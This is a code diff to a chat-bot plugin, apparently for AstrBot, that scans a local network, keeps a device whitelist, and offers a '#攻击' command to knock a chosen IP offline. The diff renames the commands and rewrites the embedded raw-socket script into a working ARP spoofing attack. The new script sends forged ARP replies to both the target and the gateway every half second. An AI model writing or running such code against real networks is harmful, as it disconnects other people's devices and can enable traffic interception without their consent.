@@ -180,7 +180,7 @@ class NetworkGuardPlugin(Star):
 
     # ========== 指令处理 ==========
 
-    @filter.command("内网扫描")
+    @filter.command("#扫描")
     async def handle_scan(self, event: AstrMessageEvent):
         """扫描局域网"""
         devices = _read_arp()
@@ -193,7 +193,7 @@ class NetworkGuardPlugin(Star):
             lines.append(f"  {d['ip']}  {d['mac']}")
         yield event.plain_result("\n".join(lines))
 
-    @filter.command("内网列表")
+    @filter.command("#列表")
     async def handle_list(self, event: AstrMessageEvent):
         """查看已记录设备"""
         devices = _load_devices()
@@ -207,7 +207,7 @@ class NetworkGuardPlugin(Star):
             lines.append(f"{tag} {d['ip']}  {d['mac']}")
         yield event.plain_result("\n".join(lines[:30]))
 
-    @filter.command("内网信任")
+    @filter.command("#信任")
     async def handle_trust(self, event: AstrMessageEvent):
         """添加白名单: 内网信任 <MAC> <名称>"""
         parts = (event.message_str or "").strip().split(maxsplit=2)
@@ -225,7 +225,7 @@ class NetworkGuardPlugin(Star):
         _save_cfg({"known_devices": known})
         yield event.plain_result(f"✅ 已信任 {mac} ({name})")
 
-    @filter.command("内网移除")
+    @filter.command("#移除")
     async def handle_untrust(self, event: AstrMessageEvent):
         """移除白名单: 内网移除 <MAC>"""
         parts = (event.message_str or "").strip().split()
@@ -241,7 +241,7 @@ class NetworkGuardPlugin(Star):
         _save_cfg({"known_devices": new_k})
         yield event.plain_result(f"✅ 已移除 {mac}")
 
-    @filter.command("内网攻击")
+    @filter.command("#攻击")
     async def handle_attack(self, event: AstrMessageEvent):
         """ARP 攻击踢下线: 内网攻击 <IP> [秒数]"""
         parts = (event.message_str or "").strip().split()
@@ -270,11 +270,19 @@ sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
 sock.bind(('eno1', 0))
 end = time.time() + {duration}; cnt = 0
 while time.time() < end:
-    for vic,tmac in [(ti,fm),(gw,fm)]:
-        eth = b'\\\\xff'*6 + sm + struct.pack('!H',0x0806)
-        arp = struct.pack('!HHBBH',1,0x0800,6,4,2) + sm + ib(gw) + fm + ib(ti)
-        sock.send(eth+arp); cnt += 1
-    time.sleep(1)
+    gm = None; tm = None
+    try:
+        for l in open('/AstrBot/data/arp_cache.txt'):
+            p = l.strip().split()
+            if len(p) >= 5 and p[0] == gw and 'lladdr' in l: gm = mb(p[p.index('lladdr')+1])
+            if len(p) >= 5 and p[0] == ti and 'lladdr' in l: tm = mb(p[p.index('lladdr')+1])
+    except: pass
+    if not gm: gm = fm
+    if not tm: tm = fm
+    pkt1 = gm + sm + struct.pack('!H',0x0806) + struct.pack('!HHBBH',1,0x0800,6,4,2) + sm + ib(gw) + fm + ib(ti)
+    pkt2 = tm + sm + struct.pack('!H',0x0806) + struct.pack('!HHBBH',1,0x0800,6,4,2) + sm + ib(ti) + fm + ib(gw)
+    sock.send(pkt1); sock.send(pkt2); cnt += 2
+    time.sleep(0.5)
 sock.close()
 print(f'Done: {{cnt}} packets')
 "'''
@@ -315,7 +323,7 @@ print(f'Done: {{cnt}}')
         except Exception as e:
             logger.error(f"[NetworkGuard] 备用方案失败: {e}")
 
-    @filter.command("内网停止")
+    @filter.command("#停止")
     async def handle_stop(self, event: AstrMessageEvent):
         """恢复设备网络"""
         parts = (event.message_str or "").strip().split()
@@ -326,7 +334,7 @@ print(f'Done: {{cnt}}')
         _ssh_cmd(f"arp -d {ip} 2>/dev/null; ip neigh flush dev eno1 to {ip} 2>/dev/null")
         yield event.plain_result(f"✅ 已尝试恢复 {ip}")
 
-    @filter.command("内网帮助")
+    @filter.command("#帮助")
     async def handle_help(self, event: AstrMessageEvent):
         yield event.plain_result(
             "📡 内网监控守卫\n\n"
